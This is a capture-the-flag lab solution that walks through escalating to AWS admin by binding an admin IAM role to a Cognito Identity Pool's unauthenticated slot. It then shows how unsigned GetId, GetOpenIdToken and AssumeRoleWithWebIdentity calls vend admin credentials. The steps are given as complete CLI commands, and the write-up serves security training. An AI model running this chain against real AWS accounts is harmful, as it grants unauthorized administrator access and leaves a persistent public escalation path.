# Solution: PassRole + Cognito Identity Pool: Unauthenticated Role Swap

Cognito Identity Pools were designed to let mobile and web applications issue temporary AWS credentials to their users — both authenticated users (via a federated identity provider like Google or Cognito User Pools) and unauthenticated guest users who haven't signed in yet. The unauthenticated flow is the interesting one for attackers: Cognito pools expose two public, unsigned API endpoints — `GetId` and `GetOpenIdToken` — that any caller on the internet can invoke without AWS credentials. If an IAM role with elevated permissions is bound to the pool's unauthenticated slot, those public endpoints become a credential-vending machine for that role.

The attack in this scenario is a PassRole exploitation with a twist. Rather than the traditional pattern where a principal passes a role to a compute service (Lambda, EC2, ECS) and then exploits that compute service to extract credentials, the attacker passes the role directly to a Cognito pool's public API layer. Once the binding is in place, no further AWS credentials are needed — the escalation path is open to any anonymous internet caller. This is what makes the attack particularly dangerous: it transforms a one-time IAM API call into a persistent, public escalation path.

The other critical detail is Cognito's two credential-vending flows. The **enhanced flow** (`GetCredentialsForIdentity`) is the modern default: Cognito attaches a managed session policy to the vended credentials that restricts them to Cognito-specific actions and blocks most IAM, SSM, and data-plane operations. The **classic flow** (`GetOpenIdToken` → `sts:AssumeRoleWithWebIdentity`) applies no session policy at all. The role's full permissions apply without restriction. This scenario requires `AllowClassicFlow=true` on the pool — and many real-world pools have it enabled for backward compatibility with older mobile SDKs.

## The Challenge

You have obtained credentials for `pl-prod-cognito-identity-001-to-admin-starting-user` — a low-privilege IAM user in the account. The user has two permissions: `iam:PassRole` scoped to the admin role in this account, and `cognito-identity:SetIdentityPoolRoles` on all resources.

Your goal is to achieve administrator access to the AWS account and retrieve the CTF flag from SSM Parameter Store. To get there, you need to understand that `SetIdentityPoolRoles` is a PassRole vector: Cognito validates `iam:PassRole` against the caller's identity before accepting the role binding, so possessing both permissions is all you need.

Start by exporting the starting user's credentials and confirming your identity:

```bash
export AWS_ACCESS_KEY_ID=<starting_user_access_key_id>
export AWS_SECRET_ACCESS_KEY=<starting_user_secret_access_key>
unset AWS_SESSION_TOKEN

aws sts get-caller-identity
```

You should see yourself as `pl-prod-cognito-identity-001-to-admin-starting-user`. Confirm you cannot read the flag directly:

```bash
aws ssm get-parameter --name /pathfinding-labs/flags/cognito-identity-001-to-admin \
  --query 'Parameter.Value' --output text
# AccessDenied
```

Good. Escalation is required.

## Reconnaissance

With the helpful permissions on this principal, you can survey the Cognito landscape before acting. Start by listing identity pools in the account:

```bash
aws cognito-identity list-identity-pools --max-results 20 --region <region>
```

You'll see `pl-prod-cognito-identity-001-to-admin-pool` in the list. Grab its pool ID and inspect it:

```bash
aws cognito-identity describe-identity-pool \
  --identity-pool-id <pool_id> --region <region>
```

The response will show `AllowUnauthenticatedIdentities: true` and `AllowClassicFlow: true`. This is the pool configuration that makes the attack possible — guest access is enabled and classic flow is on, meaning credentials vended through this pool carry the role's full permissions with no Cognito-imposed session policy.

Now check what roles are currently bound to the pool:

```bash
aws cognito-identity get-identity-pool-roles \
  --identity-pool-id <pool_id> --region <region>
```

The `unauthenticated` slot is empty — no role is bound yet. That's the gap you're going to fill.

Finally, confirm you can see the admin role and inspect its trust policy:

```bash
aws iam get-role --role-name pl-prod-cognito-identity-001-to-admin-admin-role
```

The trust policy shows `Principal.Federated: cognito-identity.amazonaws.com`, with conditions requiring `cognito-identity.amazonaws.com:aud` to equal the pool ID and `cognito-identity.amazonaws.com:amr` to contain `unauthenticated`. These are exactly the claims that Cognito will embed in the OIDC token it issues to anonymous callers of this pool — which means the trust conditions will be satisfied automatically once the role is bound.

## Exploitation

The attack has four steps. The first step requires the starting user's credentials; the remaining three require no AWS credentials at all.

**Step 1: Bind the admin role to the pool's unauthenticated slot**

Call `SetIdentityPoolRoles` as the starting user to bind the admin role to the unauthenticated slot. Cognito validates `iam:PassRole` against the caller before accepting the binding:

```bash
aws cognito-identity set-identity-pool-roles \
  --identity-pool-id <pool_id> \
  --roles unauthenticated=arn:aws:iam::<account_id>:role/pl-prod-cognito-identity-001-to-admin-admin-role \
  --region <region>
```

This call returns HTTP 200 with an empty response body on success. No news is good news. The pool is now configured to vend admin-role credentials to anonymous callers.

**Step 2: Obtain a Cognito identity ID (no AWS credentials required)**

The `GetId` endpoint is a public, unauthenticated API — you can call it with `--no-sign-request`. This flag tells the AWS CLI not to perform SigV4 request signing, demonstrating that the endpoint accepts unsigned requests from any caller:

```bash
aws cognito-identity get-id \
  --no-sign-request \
  --account-id <account_id> \
  --identity-pool-id <pool_id> \
  --region <region>
```

You'll receive a Cognito identity ID in the form `<region>:<uuid>`. Save it — you need it for the next step.

**Step 3: Get an OIDC token via the classic flow (no AWS credentials required)**

Call `GetOpenIdToken` with the identity ID you just received. Again, no SigV4 signing is needed:

```bash
aws cognito-identity get-open-id-token \
  --no-sign-request \
  --identity-id <identity_id> \
  --region <region>
```

The response contains an OIDC JWT token signed by `cognito-identity.amazonaws.com`. This token carries the claims the admin role's trust policy is waiting for: `aud=<pool_id>` and `amr=["unauthenticated"]`. Save the token value.

**Step 4: AssumeRoleWithWebIdentity (no AWS credentials required)**

Pass the OIDC token to STS to receive full admin credentials. STS authenticates the request using the OIDC token itself — no SigV4 required:

```bash
aws sts assume-role-with-web-identity \
  --no-sign-request \
  --role-arn arn:aws:iam::<account_id>:role/pl-prod-cognito-identity-001-to-admin-admin-role \
  --role-session-name cognito-escalation \
  --web-identity-token <oidc_token>
```

STS will return `AccessKeyId`, `SecretAccessKey`, and `SessionToken`. Because this is the classic flow (not `GetCredentialsForIdentity`), Cognito does not attach a managed session policy. The credentials carry the full `AdministratorAccess` policy attached to the admin role.

## Verification

Export the escalated credentials and confirm your new identity:

```bash
export AWS_ACCESS_KEY_ID=<escalated_akid>
export AWS_SECRET_ACCESS_KEY=<escalated_secret>
export AWS_SESSION_TOKEN=<escalated_session>

aws sts get-caller-identity
```

You should see an assumed-role ARN for `pl-prod-cognito-identity-001-to-admin-admin-role`. Verify the credentials carry real admin power:

```bash
aws iam list-users --max-items 3 --output table
```

It works. You are now operating with AdministratorAccess in the account.

## Capture the Flag

With admin credentials in hand, reading the flag is straightforward. The flag lives in SSM Parameter Store at the well-known path for this scenario. The `AdministratorAccess` policy attached to the admin role includes `ssm:GetParameter` on all parameters in the account — there is no additional permission needed:

```bash
aws ssm get-parameter \
  --name /pathfinding-labs/flags/cognito-identity-001-to-admin \
  --query 'Parameter.Value' \
  --output text
```

The value printed is the CTF flag for this scenario. Its exact contents are deployment-specific. The retrieval mechanism — `ssm:GetParameter` against the `/pathfinding-labs/flags/` hierarchy — is identical for every `to-admin` scenario; only the scenario ID in the path changes.

## What Happened

The attack chain was: one IAM API call (`SetIdentityPoolRoles`) followed by three unsigned public HTTP calls (`GetId`, `GetOpenIdToken`, `AssumeRoleWithWebIdentity`). The IAM portion used the starting user's credentials to bind the admin role to the pool. Everything after that required no AWS authentication at all.

This scenario highlights why `iam:PassRole` to Cognito federation principals deserves the same scrutiny as `iam:PassRole` to Lambda or EC2. The compute layer (the Cognito pool) is already provisioned and publicly reachable. The attacker doesn't need to create a new function or launch a new instance — they just need to change which role the pool hands out.

In real environments this pattern appears when teams grant broad Cognito pool management permissions to developers (so they can update app configurations), combined with pools that were set up with `AllowClassicFlow=true` for legacy SDK compatibility and an admin-scoped execution role left over from a development prototype. The individual mistakes — broad PassRole, classic flow enabled, admin role in the trust — are each easy to overlook. Together, they create a reliable, persistent escalation path that survives IAM credential rotation because it doesn't depend on stolen credentials.
